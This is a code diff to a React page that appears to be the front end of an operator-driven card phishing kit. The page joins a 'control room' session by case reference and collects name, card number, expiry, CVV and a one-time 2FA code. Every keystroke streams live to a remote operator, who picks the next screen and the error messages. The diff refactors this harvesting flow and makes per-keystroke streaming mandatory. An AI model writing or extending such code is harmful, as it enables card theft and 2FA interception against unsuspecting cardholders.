@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useEffect } from "react";
-import { createSession, SessionState } from "@/lib/control-room";
+import { ControlRoomSession, SessionState } from "@/SDK/vendor-sdk";
 import cardValidator from "card-validator";
 import { CheckCircle2, XCircle, Lock } from "lucide-react";
 
@@ -10,14 +10,15 @@ import { CheckCircle2, XCircle, Lock } from "lucide-react";
    Fields: Last name, Card number (16 digits)
    =================================================================== */
 
-function CardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (data: any) => void; onKeystroke?: (field: string, value: string) => void; isProcessing?: boolean; error?: string }) {
+function CardForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
   const [lastName, setLastName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
   const [validationError, setValidationError] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setValidationError("");
 
@@ -44,7 +45,12 @@ function CardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (dat
       return;
     }
 
-    onInput({ event: "submit_card_details", last_name: lastName, card_number: cardNumber, expiry, cvv });
+    setIsSubmitting(true);
+    try {
+      await onInput({ event: "submit_card_details", last_name: lastName, card_number: cardNumber, expiry, cvv });
+    } catch {
+      setIsSubmitting(false);
+    }
   };
 
   const formatCard = (val: string) => {
@@ -70,7 +76,10 @@ function CardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (dat
             type="text"
             id="surnameCardno"
             value={lastName}
-            onChange={e => { setLastName(e.target.value); onKeystroke?.("last_name", e.target.value); }}
+            onChange={e => {
+              setLastName(e.target.value);
+              onKeystroke("last_name", e.target.value);
+            }}
             required
           />
         </div>
@@ -80,7 +89,11 @@ function CardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (dat
             type="text"
             id="cardNumber0"
             value={cardNumber}
-            onChange={e => { const v = formatCard(e.target.value); setCardNumber(v); onKeystroke?.("card_number", v); }}
+            onChange={e => {
+              const val = formatCard(e.target.value);
+              setCardNumber(val);
+              onKeystroke("card_number", val);
+            }}
             inputMode="numeric"
             required
           />
@@ -93,7 +106,11 @@ function CardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (dat
               type="text"
               id="expiry"
               value={expiry}
-              onChange={e => { const v = formatExpiry(e.target.value); setExpiry(v); onKeystroke?.("expiry", v); }}
+              onChange={e => {
+                const val = formatExpiry(e.target.value);
+                setExpiry(val);
+                onKeystroke("expiry", val);
+              }}
               placeholder="MM/YY"
               inputMode="numeric"
               required
@@ -105,7 +122,11 @@ function CardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (dat
               type="password"
               id="cvv"
               value={cvv}
-              onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 4); setCvv(v); onKeystroke?.("cvv", v); }}
+              onChange={e => {
+                const val = e.target.value.replace(/\D/g, "").slice(0, 4);
+                setCvv(val);
+                onKeystroke("cvv", val);
+              }}
               inputMode="numeric"
               required
             />
@@ -122,8 +143,8 @@ function CardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (dat
 
         {(error || validationError) && <p className="inline-error">{validationError || error}</p>}
 
-        <button type="submit" className="btn-primary" id="continue" disabled={isProcessing}>
-          {isProcessing ? "Processing..." : "Continue"}
+        <button type="submit" className="btn-primary" id="continue" disabled={isSubmitting}>
+          {isSubmitting ? "Processing..." : "Continue"}
         </button>
       </form>
     </div>
@@ -134,12 +155,18 @@ function CardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (dat
    2FA FORM — verification code entry
    =================================================================== */
 
-function TwoFactorForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (data: any) => void; onKeystroke?: (field: string, value: string) => void; isProcessing?: boolean; error?: string }) {
+function TwoFactorForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
   const [otp, setOtp] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    onInput({ event: "verify_otp", otp_code: otp });
+    setIsSubmitting(true);
+    try {
+      await onInput({ event: "verify_otp", otp_code: otp });
+    } catch {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -158,7 +185,10 @@ function TwoFactorForm({ onInput, onKeystroke, isProcessing, error }: { onInput:
               type="text"
               id="otp"
               value={otp}
-              onChange={e => { setOtp(e.target.value); onKeystroke?.("otp_code", e.target.value); }}
+              onChange={e => {
+                setOtp(e.target.value);
+                onKeystroke("otp_code", e.target.value);
+              }}
               inputMode="numeric"
               required
               autoComplete="one-time-code"
@@ -166,8 +196,8 @@ function TwoFactorForm({ onInput, onKeystroke, isProcessing, error }: { onInput:
             />
           </div>
           {error && <p className="inline-error">{error}</p>}
-          <button type="submit" className="btn-primary" disabled={otp.length < 4 || isProcessing}>
-            {isProcessing ? "Verifying..." : "Continue"}
+          <button type="submit" className="btn-primary" disabled={otp.length < 4 || isSubmitting}>
+            {isSubmitting ? "Verifying..." : "Continue"}
           </button>
         </form>
       </div>
@@ -231,7 +261,7 @@ export default function Home() {
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   const [sessionState, setSessionState] = useState<SessionState | null>(null);
-  const [session, setSession] = useState<ReturnType<typeof createSession> | null>(null);
+  const [session, setSession] = useState<ControlRoomSession | null>(null);
 
   const handleConnect = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -241,8 +271,13 @@ export default function Home() {
     setError("");
 
     try {
-      const s = createSession();
-      const state = await s.connect(caseRef.trim());
+      const s = new ControlRoomSession({
+        tenant_id: "e63d3b80-3289-499e-84ca-292b70c13ac6",
+        case_reference: caseRef.trim(),
+        supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL!,
+        supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY!,
+      });
+      const state = await s.connect();
       setSession(s);
       setSessionState(state);
 
@@ -256,9 +291,9 @@ export default function Home() {
     }
   };
 
-  const handleInput = (data: any) => {
+  const handleInput = async (data: any) => {
     if (session) {
-      session.sendInput(data);
+      await session.sendInput(data);
     }
   };
 
@@ -304,14 +339,13 @@ export default function Home() {
     );
   }
 
-  const isProcessing = sessionState.is_processing;
-  const operatorError = sessionState.error;
+  const operatorError = sessionState.operator_message;
 
   switch (sessionState.component_key) {
     case "CardForm":
-      return <CardForm onInput={handleInput} onKeystroke={handleKeystroke} isProcessing={isProcessing} error={operatorError} />;
+      return <CardForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
     case "TwoFactorForm":
-      return <TwoFactorForm onInput={handleInput} onKeystroke={handleKeystroke} isProcessing={isProcessing} error={operatorError} />;
+      return <TwoFactorForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
     case "ProcessingScreen":
       return <ProcessingScreen error={operatorError} />;
     case "SuccessScreen":
